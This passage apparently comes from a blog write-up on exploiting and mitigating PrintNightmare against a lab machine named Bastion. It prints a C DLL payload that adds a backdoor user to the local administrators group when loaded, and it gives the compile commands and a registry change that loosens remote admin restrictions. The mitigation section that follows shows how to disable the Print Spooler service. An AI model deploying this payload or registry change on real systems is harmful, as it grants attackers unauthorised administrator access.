+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
+</span><span class="c1">// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
+</span><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">Entry</span> <span class="p">(){</span> <span class="c1">//Default function that is executed when the DLL is loaded
+</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net user iamf &lt;password&gt; /add&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net localgroup administrators iamf /add&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">){</span>
+        <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+            <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">Entry</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>The code can be compiled from Linux using <code>mingw-w64</code> compiler (<code>sudo apt install mingw-w64</code>). I will run the following command to compile the DLL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
+</code></pre></div><p>On Bastion, although the exploit successfully evade the AV and the backdoor user was added into the machine, I&rsquo;m unable to login via WinRM. However,  <code>impacket-psexec</code> will do.</p>
+<p><div class="img-container"><img src="imgs/image-20210730191657750.png" alt="image-20210730191657750"  /></div>
+</p>
+<p>Further investigation, I found out that  <code>Invoke-Command</code> from localhost is allowed.</p>
+<p><div class="img-container"><img src="imgs/image-20210730192152601.png" alt="image-20210730192152601"  /></div>
+</p>
+<p>So, I guess the WinRM was configured to only allow admin account for remote access. I couldn&rsquo;t get the &ldquo;right&rdquo; keywords to <em>google</em> this. Below are what I&rsquo;ve tried so far:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ winrm get winrm/config
+$ winrm get winrm/config/listener
+$ <span class="o">(</span>Get-PSSessionConfiguration -Name Microsoft.PowerShell<span class="o">)</span>.Permission
+$ HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem
+$ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class="m">1</span> /f
+</code></pre></div><h2 id="mitigation">Mitigation</h2>
+<p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare:</p>
+<ul>
+<li>Disable Print Spooler service</li>
+<li>Disable inbound remote printing through Group Policy.</li>
+</ul>
+<p>Also, it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.  I have no idea to work with the second option from CLI, so I will demo the first one.</p>
+<h4 id="disable-print-spooler-service">Disable Print Spooler Service</h4>
+<p>Based on Microsoft guidance, I need to determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ Stop-Service -Name Spooler -Force
+$ Set-Service -Name Spooler -StartupType Disabled
+</code></pre></div><p>I will run that on Bastion.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Get-Service -Name Spooler 
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  Spooler            Print Spooler
+
+
+*Evil-WinRM* PS C:<span class="se">\&gt;</span> Stop-Service -Name Spooler -Force
+*Evil-WinRM* PS C:<span class="se">\&gt;</span> Set-Service -Name Spooler -StartupType Disabled
+</code></pre></div><p>After disabling Spooler service, I ran the exploit again, but this time, it returned a &ldquo;Connection Failed&rdquo; message.</p>
+<p><div class="img-container"><img src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  /></div>
+</p>
+<p>The workaround is worked! But, the downside is that you loss the ability to print from both local and remote 🙃.</p>
+<p>For more detailed mitigation, you can go to <a href="https://github.com/LaresLLC/CVE-2021-1675">this GitHub repo</a>.</p>
+]]></content:encoded>
     </item>
     
   </channel>
